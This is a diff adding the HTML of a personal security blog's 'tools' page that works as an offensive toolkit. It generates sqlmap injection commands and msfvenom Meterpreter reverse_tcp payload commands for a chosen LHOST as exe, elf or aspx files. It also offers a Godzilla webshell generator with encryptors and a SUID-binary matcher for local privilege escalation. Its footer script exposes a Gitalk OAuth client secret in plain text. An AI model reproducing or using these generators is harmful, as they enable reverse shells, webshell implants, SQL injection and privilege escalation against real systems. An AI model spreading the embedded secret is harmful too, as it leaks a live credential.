@@ -1,0 +1,453 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>1y0ng's Blog | 1y0ng's Blog</title><meta name="author" content="1y0ng"><meta name="copyright" content="1y0ng"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="&#x2F;* 添加自定义样式 *&#x2F;     body {       font-family: Arial, sans-serif;       padding: 20px;     }       input[type&#x3D;&quot;text&quot;], select {       margin-bottom: 10px;       background-color: white;  &#x2F;*">
+<meta property="og:type" content="website">
+<meta property="og:title" content="1y0ng&#39;s Blog">
+<meta property="og:url" content="http://example.com/html/tools/tools.html">
+<meta property="og:site_name" content="1y0ng&#39;s Blog">
+<meta property="og:description" content="&#x2F;* 添加自定义样式 *&#x2F;     body {       font-family: Arial, sans-serif;       padding: 20px;     }       input[type&#x3D;&quot;text&quot;], select {       margin-bottom: 10px;       background-color: white;  &#x2F;*">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://mms2.baidu.com/it/u=1947906842,837644983&fm=253&app=120&f=JPEG&fmt=auto&q=75?w=500&h=500">
+<meta property="article:published_time" content="2023-10-06T08:35:09.877Z">
+<meta property="article:modified_time" content="2023-10-06T08:35:09.877Z">
+<meta property="article:author" content="1y0ng">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://mms2.baidu.com/it/u=1947906842,837644983&fm=253&app=120&f=JPEG&fmt=auto&q=75?w=500&h=500"><link rel="shortcut icon" href="/img/favicon2.png"><link rel="canonical" href="http://example.com/html/tools/tools.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fonts.loli.net/css?family=Righteous" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '1y0ng\'s Blog',
+  isPost: false,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2023-10-06 16:35:09'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = url => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      link.onload = () => resolve()
+      link.onerror = () => reject()
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="/css/tou.css"><link rel="stylesheet" href="/css/background.css"><link rel="stylesheet" href="/css/font.css"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="1y0ng's Blog" type="application/atom+xml">
+</head><body><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><div class="loading-img"></div><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+
+if (false) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><link rel="stylesheet" href="/css/progress_bar.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="http://mms2.baidu.com/it/u=1947906842,837644983&amp;fm=253&amp;app=120&amp;f=JPEG&amp;fmt=auto&amp;q=75?w=500&amp;h=500" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">25</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">16</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/html/tools/tools.html"><i class="fa-fw fas fa-toolbox"></i><span> 工具</span></a></div></div></div></div><div class="page" id="body-wrap"><header class="not-home-page" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="1y0ng's Blog"><span class="site-name">1y0ng's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/html/tools/tools.html"><i class="fa-fw fas fa-toolbox"></i><span> 工具</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="page-site-info"><h1 id="site-title">1y0ng's Blog</h1></div></header><main class="layout" id="content-inner"><div id="page"><div id="article-container"><!DOCTYPE html>
+<html>
+<head>
+  <style>
+    /* 添加自定义样式 */
+    body {
+      font-family: Arial, sans-serif;
+      padding: 20px;
+    }
+
+
+    input[type="text"], select {
+      margin-bottom: 10px;
+      background-color: white;
+
+/*      height: 20px;*/
+      border:1px solid #b9b8b8;
+    }
+
+    button {
+
+      padding: 3px 20px;
+      
+      height: 23px;
+      background-color: white;
+      color: black;
+      border: none;
+      cursor: pointer;
+      font-size: 12px;
+      border:1px solid #b9b8b8;
+    }
+
+
+
+    .container {
+      position: relative;
+      display: inline-block;
+    }
+
+    .box {
+      border: 1px solid #ccc;
+      padding: 10px;
+      width: 500px;
+      height: auto;
+    }
+
+  </style>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.0.0/crypto-js.min.js"></script>
+    <script src="sqlmap.js"></script>
+    <script src="godzilla.js"></script>
+</head>
+<body>
+<center>
+	<p style="font-weight:bold;">SQLMAP statement generation</p>
+  <label for="target">目标：</label>
+  <input type="text" id="target" value="post1.txt" oninput="generateSentence()">
+  <br>
+
+  <label for="point">参数：</label>
+  <input type="text" id="point" oninput="generateSentence()">
+  <br>
+  <label for="proxy">代理：</label>
+  <input type="text" id="proxy" value="http://127.0.0.1:7890" oninput="generateSentence()">
+  <br>
+  <label for="dbms">数据库:</label>
+  <select id="dbms">
+    <option value="--dbms MySQL">MySQL</option>
+    <option value="--dbms Oracle">Oracle</option>
+    <option value="--dbms PostgreSQL">PostgreSQL</option>
+    <option value="--dbms Microsoft SQL Server">Microsoft SQL Server</option>
+    <option value="--dbms Microsoft Access">Microsoft Access</option>
+    <option value="--dbms SQLite">SQLite</option>
+  </select>
+  <br>
+    <label for="technique">注入方式:</label>
+  <select id="technique">
+    <option value="">不指定</option>
+    <option value="--technique B">布尔型盲注（Boolean-based blind）</option>
+    <option value="--technique E">报错型注入（Error-based）</option>
+    <option value="--technique U">联合查询注入（UNION query-based）</option>
+    <option value="--technique S">堆叠查询注入（Stacked queries）</option>
+    <option value="--technique T">时间型盲注（Time-based blind）</option>
+    <option value="--technique Q">内联查询注入（inline Query）</option>
+  </select>
+
+
+  <br>
+          <button style="margin-right: 50px;" onclick="generateSentence()">生成</button>
+        <button style="margin-right: 50px;" onclick="copyToClipboard('result')">复制</button>
+  <p id="result"></p>
+<br><br>
+<p style="font-weight:bold;">MSF statement generation</p>
+  <label for="payload">payload:</label>
+  <select id="payload" onchange="getMSF()">
+    <option value="windows/meterpreter/reverse_tcp">windows/meterpreter/reverse_tcp</option>
+    <option value="windows/x64/meterpreter/reverse_tcp">windows/x64/meterpreter/reverse_tcp</option>
+    <option value="linux/x86/meterpreter/reverse_tcp">linux/x86/meterpreter/reverse_tcp</option>
+    <option value="linux/x64/meterpreter/reverse_tcp">linux/x64/meterpreter/reverse_tcp</option>
+  </select>
+  <br>
+  <label for="LHOST">LHOST=</label>
+  <input type="text" id="LHOST" oninput="getMSF()">
+  <br>
+  <label for="LPORT">LPORT=</label>
+  <input type="text" id="LPORT" value="4444" oninput="getMSF()">
+  <br>
+  <label for="format">文件格式</label>
+  <select id="format" onchange="getMSF()">
+    <option value="exe">exe</option>
+    <option value="elf">elf</option>
+    <option value="asp">asp</option>
+    <option value="aspx">aspx</option>
+    <!-- <option value="aspx">aspx</option> -->
+  </select>
+  <br>
+  <label for="filename">文件名</label>
+  <input type="text" id="filename" oninput="getMSF()">
+  <br>
+  <p id="MSFCOMAND"></p>
+
+<br><br>
+<p style="font-weight:bold;">Godzilla payload generation</p>
+  <div style="border: 1px solid #818181; width: 520px; height: 250px;">
+    <div style="height: 30px; display: flex; align-items: center;">
+      
+      <img src="java.ico"  style="height:18px ; margin: 6px;" alt="java">
+      <p style="font-size: 12px;margin-top: 15px;">GenerateShell</p>
+    </div>
+    <div style="background-color:#f3f1f1;padding-top: 30px; padding-bottom: 15px;">
+      <div ><center>
+        <label style="font-size:12px;margin-top: 10px;" for="password">密码</label>
+        <input style="margin-left: 30px;margin-top: 10px;" type="text" id="password" value="pass">
+        <br>
+
+        <label style="font-size:12px;" for="key">密钥</label>
+        <input style="margin-left: 30px;" type="text" id="key" value="key">
+        <br>
+        <label style="font-size:12px;" for="godpayload">有效载荷</label>
+        <select style="margin-left: 30px;height: 23px;" id="godpayload" onchange="updateencryptor()">
+          <option value="AspDynamicPayload">AspDynamicPayload</option>
+          <option value="JavaDynamicPayload">JavaDynamicPayload</option>
+          <option value="CShapDynamicPayload">CShapDynamicPayload</option>
+          <option value="PhpDynamicPayload">PhpDynamicPayload</option>
+        </select>
+
+        <br>
+        <label style="font-size:12px;" for="encryptor">加密器</label>
+        <select style="margin-left: 30px;height: 23px;" id="encryptor">
+          <option value="ASP_EVAL_BASE64">ASP_EVAL_BASE64</option>
+          <option value="ASP_XOR_BASE64">ASP_XOR_BASE64</option>
+          <option value="ASP_XOR_RAW">ASP_XOR_RAW</option>
+          <option value="ASP_RAW">ASP_RAW</option>
+          <option value="ASP_BASE64">ASP_BASE64</option>
+        </select>
+        <br>
+
+        <button style="margin-right: 50px;" onclick="generateFunction()">生成</button>
+        <button style="margin-right: 50px;" onclick="copyToClipboard('finshell')">复制</button>
+      </center>
+      </div>
+    </div>
+  </div>
+  <!-- <p id="finshell"></p> -->
+  <br>
+  <div class="container">
+    <div class="box">
+      <span id="finshell"></span>
+    </div>
+
+  </div>
+
+<br><br><br>
+
+    <p style="font-weight:bold;">find / -user root -perm -4000 -print 2>/dev/null</p>
+    <textarea style="width: 550px; height: 341px;" id="suid"></textarea><br><br>
+    <button style="margin-right: 50px;" onclick="getsuid()">查询</button>
+    <div id="suidresult"></div>
+
+</center>
+
+<script>
+  function copyToClipboard(input) {
+      var text = document.getElementById(input).innerText;
+      navigator.clipboard.writeText(text)
+        .then(function() {
+          console.log("文本已成功复制到剪切板");
+          alert("文本已成功复制到剪切板");
+        })
+        .catch(function(error) {
+          console.error("复制文本时出现错误:", error);
+        });
+  }
+  function encryptStringToMD5(input) {
+  var encrypted = CryptoJS.MD5(input).toString();
+  var result = encrypted.substring(0, 16);
+  return result;
+}
+function getMD5(input){
+  var encrypted = CryptoJS.MD5(input).toString();
+  return encrypted;
+}
+
+  function getMSF() {
+    var payload = document.getElementById("payload").value;
+    var LPORT = document.getElementById("LPORT").value;
+    var filename = document.getElementById("filename").value;
+    var LHOST = document.getElementById("LHOST").value;
+    var format = document.getElementById("format").value;
+
+    // alert(option1);
+    var resultElement = document.getElementById("MSFCOMAND");
+    
+    
+    var sentence = `msfvenom -p ${payload} LHOST=${LHOST} LPORT=${LPORT} -f ${format} > ${filename}`;
+    resultElement.textContent = sentence;
+  }
+
+  function getsuid(){
+    var strings = ["awk", "bash", "csh","dmesg","docker","ed","env","expect","find","flock","ftp","gdb","gimp","git","ionice","ip","ksh","less","logsave","make","man","more","nano","nice","nmap","openssl","php","python","rpm","rsync","rvim","setarch","socat","ssh","strace","stdbuf","taskset","tclsh","time","timeout","vim","watch","xargs","zsh"];
+    var suid = document.getElementById("suid").value;
+    var suidresult = document.getElementById("suidresult");
+    var su = "";
+    strings.forEach(function(string) {
+      if (suid.includes("/"+string)) {
+        su=su+`${string}`+"\n";
+      }
+    });
+    suidresult.textContent=su;
+  }
+
+
+  
+
+
+
+
+</script></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="gitalk-container"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="http://mms2.baidu.com/it/u=1947906842,837644983&amp;fm=253&amp;app=120&amp;f=JPEG&amp;fmt=auto&amp;q=75?w=500&amp;h=500" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">1y0ng</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">25</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">16</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/1y0ng"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/1y0ng" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="https://1y0ng.github.io" target="_blank" title="Home Page"><i class="fas fa-house"></i></a><a class="social-icon" href="https://blog.csdn.net/qq_62370574?type=blog" target="_blank" title="CSDN"><i class="fas fa-c"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/msi%E6%9C%A8%E9%A9%AC%E5%88%9B%E5%BB%BA/" title="msi木马创建">msi木马创建</a><time datetime="2023-08-22T02:30:44.000Z" title="发表于 2023-08-22 10:30:44">2023-08-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E5%87%86%E6%8E%A5%E5%85%A5/" title="一个简单的准接入">一个简单的准接入</a><time datetime="2023-07-02T06:05:10.000Z" title="发表于 2023-07-02 14:05:10">2023-07-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0/" title="恶意代码逃逸学习">恶意代码逃逸学习</a><time datetime="2023-06-15T06:55:30.000Z" title="发表于 2023-06-15 14:55:30">2023-06-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/agent%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/" title="agent内存马学习">agent内存马学习</a><time datetime="2023-06-06T06:57:17.000Z" title="发表于 2023-06-06 14:57:17">2023-06-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/%E9%82%AE%E7%AE%B1%E9%92%93%E9%B1%BC%E5%AD%A6%E4%B9%A0/" title="邮箱钓鱼学习">邮箱钓鱼学习</a><time datetime="2023-06-04T07:35:21.000Z" title="发表于 2023-06-04 15:35:21">2023-06-04</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
+            <i class="fas fa-folder-open"></i>
+            <span>分类</span>
+            
+            </div>
+            <ul class="card-category-list" id="aside-cat-list">
+            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/JAVA/"><span class="card-category-list-name">JAVA</span><span class="card-category-list-count">10</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E4%BD%BF%E7%94%A8%E4%BD%93%E9%AA%8C/"><span class="card-category-list-name">使用体验</span><span class="card-category-list-count">2</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E6%8A%80%E6%9C%AF/"><span class="card-category-list-name">技术</span><span class="card-category-list-count">6</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E6%B8%97%E9%80%8F/"><span class="card-category-list-name">渗透</span><span class="card-category-list-count">4</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E7%BB%8F%E5%8E%86/"><span class="card-category-list-name">经历</span><span class="card-category-list-count">1</span></a></li>
+            </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/alist/" style="font-size: 1.1em; color: #999">alist</a> <a href="/tags/ipv6/" style="font-size: 1.3em; color: #99a1ac">ipv6</a> <a href="/tags/seafile/" style="font-size: 1.1em; color: #999">seafile</a> <a href="/tags/xxe/" style="font-size: 1.1em; color: #999">xxe</a> <a href="/tags/zerotier/" style="font-size: 1.1em; color: #999">zerotier</a> <a href="/tags/%E5%85%8D%E6%9D%80/" style="font-size: 1.3em; color: #99a1ac">免杀</a> <a href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/" style="font-size: 1.3em; color: #99a1ac">内存马</a> <a href="/tags/%E5%87%86%E5%85%A5/" style="font-size: 1.1em; color: #999">准入</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.5em; color: #99a9bf">反序列化</a> <a href="/tags/%E6%8F%90%E6%9D%83/" style="font-size: 1.3em; color: #99a1ac">提权</a> <a href="/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/" style="font-size: 1.1em; color: #999">服务器</a> <a href="/tags/%E6%9C%A8%E9%A9%AC/" style="font-size: 1.1em; color: #999">木马</a> <a href="/tags/%E6%A8%AA%E5%90%91/" style="font-size: 1.1em; color: #999">横向</a> <a href="/tags/%E7%A4%BE%E5%B7%A5/" style="font-size: 1.1em; color: #999">社工</a> <a href="/tags/%E7%BB%B4%E6%9D%83/" style="font-size: 1.1em; color: #999">维权</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 1.1em; color: #999">靶场</a></div></div><div class="card-widget card-archives"><div class="item-headline"><i class="fas fa-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/08/"><span class="card-archive-list-date">八月 2023</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/07/"><span class="card-archive-list-date">七月 2023</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/06/"><span class="card-archive-list-date">六月 2023</span><span class="card-archive-list-count">3</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/05/"><span class="card-archive-list-date">五月 2023</span><span class="card-archive-list-count">1</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/04/"><span class="card-archive-list-date">四月 2023</span><span class="card-archive-list-count">4</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/03/"><span class="card-archive-list-date">三月 2023</span><span class="card-archive-list-count">8</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/02/"><span class="card-archive-list-date">二月 2023</span><span class="card-archive-list-count">4</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/01/"><span class="card-archive-list-date">一月 2023</span><span class="card-archive-list-count">3</span></a></li></ul></div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站资讯</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">25</div></div><div class="webinfo-item"><div class="item-name">已运行时间 :</div><div class="item-count" id="runtimeshow" data-publishDate="2023-01-21T16:00:00.000Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总字数 :</div><div class="item-count">41.3k</div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总访问量 :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2023-10-06T08:38:22.095Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('http://p5.qhimg.com/bdr/__85/t016608f207bd942436.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2023 By 1y0ng</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">I hope you are surrounded, and your path should be full of flowers and people.<p><a target="_blank" href="https://hexo.io/"><img src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&logo=hexo" title="博客框架为Hexo"></a>&nbsp;<a target="_blank" href="https://butterfly.js.org/"><img src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&logo=bitdefender" title="主题采用butterfly"></a>&nbsp;<a target="_blank" href="https://github.com/"><img src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&logo=GitHub" title="本站项目由Gtihub托管"></a>&nbsp;<a target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&logo=Claris" title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"></a></p></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadGitalk () {
+  function initGitalk () {
+    var gitalk = new Gitalk(Object.assign({
+      clientID: '94b011918fa9c2f8b107',
+      clientSecret: '10c1ce2d3cc22cc3586cb5ce5f7b322f1ebc1c6d',
+      repo: '1y0ng.github.io',
+      owner: '1y0ng',
+      admin: ['1y0ng'],
+      id: '63730af9fa1d58c2f7bb1eae335f311b',
+      updateCountCallback: commentCount
+    },null))
+
+    gitalk.render('gitalk-container')
+  }
+
+  if (typeof Gitalk === 'function') initGitalk()
+  else {
+    getCSS('https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css')
+    getScript('https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.js').then(initGitalk)
+  }
+}
+
+function commentCount(n){
+  let isCommentCount = document.querySelector('#post-meta .gitalk-comment-count')
+  if (isCommentCount) {
+    isCommentCount.innerHTML= n
+  }
+}
+
+if ('Gitalk' === 'Gitalk' || !false) {
+  if (false) btf.loadComment(document.getElementById('gitalk-container'), loadGitalk)
+  else loadGitalk()
+} else {
+  function loadOtherComment () {
+    loadGitalk()
+  }
+}</script></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
